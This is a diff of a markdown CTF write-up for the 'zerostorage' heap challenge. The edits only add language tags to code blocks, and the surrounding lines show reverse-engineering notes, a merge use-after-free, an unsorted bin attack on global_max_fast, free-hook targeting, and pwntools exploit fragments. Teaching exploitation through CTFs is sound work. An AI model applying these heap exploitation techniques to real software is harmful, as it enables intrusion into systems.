@@ -4,7 +4,7 @@
 
 First, we will understand how the binary functions and see what sort of constraints we will have to face. To begin, let's see what type of type of file this is and what mitigations it holds.
 
-```
+```console
 ➜  zerostorage file zerostorage
 zerostorage: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=93c36d63b011f873b2ba65c8562c972ffbea10d9, stripped
 ➜  zerostorage checksec zerostorage
@@ -21,7 +21,7 @@ As can be seen, this is a 64-bit ELF and there are all mitigation techniques. RE
 
 Now let's look at this binary in Ghidra. The main function is located at address 100c40, and this contains a menu of options. 
 
-```
+```c
   puts("== Zero Storage ==");
   puts("1. Insert");
   puts("2. Update");
@@ -38,7 +38,7 @@ This menu function shows that we have a few standard options for a heap exploita
 
 Before this menu is printed, a function at 00100f20 is called. This function sets buffering for stdin and stdout, and it also sets an alarm (common practice for CTF challenges). Additionally, /dev/urandom is opened and 8 bytes are read into a global variable. For now we can call this variable GLOBAL_KEY, and we will see how this is used later.
 
-```
+```c
   setvbuf(stdin,(char *)0x0,2,0);
   setvbuf(stdout,(char *)0x0,2,0);
   alarm(0x3c);
@@ -56,7 +56,7 @@ Before this menu is printed, a function at 00100f20 is called. This function set
 
 The insert function is located at 00100fd0. Here, we can see that the size of our chunk must be between 0x80 and 0x1000. With the metadata, that means we can only make heaps of sizes at least 0x90. This means that we cannot use fastbins, so we will have to find another exploitation type. Also, we can see that the pointers are xored with a global key before they are stored in the binary, so it may be hard to exploit these. Luckily, we will be able to use the unsorted bin, so we will look into that attack after the static analysis.
 
-```
+```text
       if (0 < entry_length) {
         intermediate_len = 0x1000;
         if (entry_length < 0x1001) {
@@ -71,7 +71,7 @@ The insert function is located at 00100fd0. Here, we can see that the size of ou
 
 After this, the pointer to the chunk and size are saved into some special global variables. I labelled these arrays as follows:
 
-```
+```text
           enc_ptr = (ulong)chunk_ptr ^ GLOBAL_KEY;
           (&IN_USE)[lVar2 * 6] = 1;
           (&CHUNK_SIZES)[lVar2 * 3] = (long)intermediate_len;
@@ -83,7 +83,7 @@ After this, the pointer to the chunk and size are saved into some special global
 
 The delete function is located at 00101530. This delete function free's the heap pointer at the index of choice, and it also zeros out this pointer before returning. This should be effective for preventing a use after free, so this function does not appear to be exploitable. Additionally, it makes sure that the chunk is in use before freeing it, so this prevents double frees.
 
-```
+```c
   if ((uint)heap_index < 0x20) {
     index = (long)(int)(uint)heap_index;
     if ((&IN_USE)[index * 6] == 1) {
@@ -103,7 +103,7 @@ The delete function is located at 00101530. This delete function free's the heap
 
 The view function (00101600) show's the size of bytes from the heap pointer. This function could possibly be used to get an info leak later on, but we still have not found an exploitable bug that could let us use a free heap.
 
-```
+```c
   entry_num = get_choice();
   if ((entry_num < 0x20) && (this_entry = (long)(int)entry_num, (&IN_USE)[this_entry * 6] == 1)) {
     __printf_chk(1,"Entry No.%d:\n",(ulong)entry_num);
@@ -117,7 +117,7 @@ The view function (00101600) show's the size of bytes from the heap pointer. Thi
 
 The merge function (located at 001012c0) has two different possible code paths. If the combined size of the two chunks is the same as either chunk or less than 0x80, a new index is created but the merge to poinnter is used. However, if they are different, a realloc is performed to create a new chunk. Then, the merge from chunk is freed. This is a problem because if the two indeces are the same, the chunk will be freed and the newly created chunk will point to this freed region. This let's us use and view a free chunk, which is perfect! 
 
-```
+```c
               if (total_size_final != to_size_final) {
                 to_ptr = realloc(to_ptr,total_size_final);
                 if (to_ptr == (void *)0x0) {
@@ -147,7 +147,7 @@ In order to satisfy this condition, the combination of to and from sizes should 
 
 The update function, located at 00101120, lets you create a new chunk at an index. It uses realloc to create a new chunk of the appropriate size, and then you can input the characters in with no overflow. Additionally, it checks to make sure that the chunk is at least 0x80 large, so again fastbin attacks are mitigated.
 
-```
+```c
       if (0 < entry_len) {
         int_len = 0x1000;
         if (entry_len < 0x1001) {
@@ -184,7 +184,7 @@ The unsorted bin attack is a very strong attack when you cannot use fastbins. As
 
 To start this unsorted bin attack, we will insert two chunks. The first should have a size of less than 0x80 because this will be the chunk that we merge with itself. We need a second chunk to prevent this chunk from consolidating with the forest, and we can play with the size of this as needed. To test, I will just insert chunks of size 0x20 onto the heap, and they will have 0x1f A's and 0x1f B's. Then, I will merge 0 with 0, to create the use after free. This will create a chunk 2 that points to the freed region, and I can use the view functionality.
 
-```
+```python
 from pwn import *
 
 context.terminal = ['tmux', 'splitw', '-h']
@@ -228,7 +228,7 @@ view(2)
 
 After viewing this chunk, we can use gdb to determine the offsets of the important addresses. At this point, we determine what we would like to attack with the unsorted bin exploit as well. In libc, there is a global variable known as global_max_fast, and this holds the size of the largest allowable fastbin for free to create. 
 
-```
+```gdb
 gef➤  p &global_max_fast
 $1 = (size_t *) 0x7f06ef8767f8 <global_max_fast>
 gef➤  x/gx 0x7f06ef8767f8
@@ -237,7 +237,7 @@ gef➤  x/gx 0x7f06ef8767f8
 
 In a standard 64 bit heap, 0x80 is the largest size of any fastbin in the heap. However, we should be able to change this by acting like a fake unsorted bin is stored at this address. However, we will have to subtract 0x10 from this address when we create our fake chunk because we want the forward and backwards pointers to overlap with the global_max_fast. We will calculate the address of this, as well as some other important addresses, by unpacking the 8 bytes that we can view in this freed chunk.
 
-```
+```text
 leak = u64(target.recv(8))
 libc = leak - 0x3c4b78
 global_max_fast = libc + 0x3c67f8
@@ -247,7 +247,7 @@ free_hook = libc + libc_bin.symbols['__free_hook']
 
 To carry out the unsorted bin attack, we will edit the pointers on the chunk and see how they are referenced when a new chunk is created. To do this, we could statically review the code about unsorted bins in the malloc source code. An easier way would be to overwrite the pointers with two different, recognizable values, like "aaaaaaaa" and "bbbbbbbb". Then, when it SEGFAULTS, we can look at the crash to see which pointer was being written to!
 
-```
+```text
 edit(2, 0x20, "aaaaaaaa" + "bbbbbbbb" + "C" *0xf)
 
 insert(0x20, "D"*0x1f)       # 0
@@ -255,7 +255,7 @@ insert(0x20, "D"*0x1f)       # 0
 
 Now, let's run this and see where it crashes:
 
-```
+```gdb
 Program received signal SIGSEGV, Segmentation fault.
 _int_malloc (av=av@entry=0x7f61e1e74b20 <main_arena>, bytes=bytes@entry=0x80) at malloc.c:3516
 3516    malloc.c: No such file or directory.
@@ -317,7 +317,7 @@ gef➤
 
 As can be seen, the instruction that failed involved writing to an offset of 0x10 from r15. r15 holds all b's at this point, so we can see that it tried to write to the second pointer, the backwards pointer. The value that is being written is some libc address, which turns out to be the head of the unsorted bin list in libc. Let's modify our code to write to the global_max_fast instead, taking into account the offset of 0x10 as well:
 
-```
+```python
 edit(2, 0x20, "aaaaaaaa" + p64(global_max_fast-0x10) + "C"*0xf)
 
 insert(0x20, "D"*0x1f)       # 0
@@ -326,14 +326,14 @@ target.interactive()
 
 Now, we will run this and check what value is in the global_max_fast variable:
 
-```
+```gdb
 gef➤  x/gx &global_max_fast
 0x7fc8cf93b7f8 <global_max_fast>:       0x00007fc8cf939b78
 ```
 
 Awesome! Now the global_max_fast is a very large value, much larger than 0x80. That means that we can make fastbins of enormous size, so the minimum size of 0x80 is no longer an issue. As with any fastbin attack, we need to find a good place to create a fake fastbin, so we should look for an area that has a good fake size. The best target for a binary with full RELRO is the free hook or the malloc hook. 
 
-```
+```gdb
 gef➤  p &__free_hook
 $1 = (void (**)(void *, const void *)) 0x7ff1e9e607a8 <__free_hook>
 gef➤  x/60gx 0x7ff1e9e607a8 - 0x59
@@ -376,7 +376,7 @@ Originally, I wanted to overwrite the free hook with a magic gadget. However, no
 
 Here is the final exploit:
 
-```
+```python
 from pwn import *
 
 context.terminal = ['tmux', 'splitw', '-h']
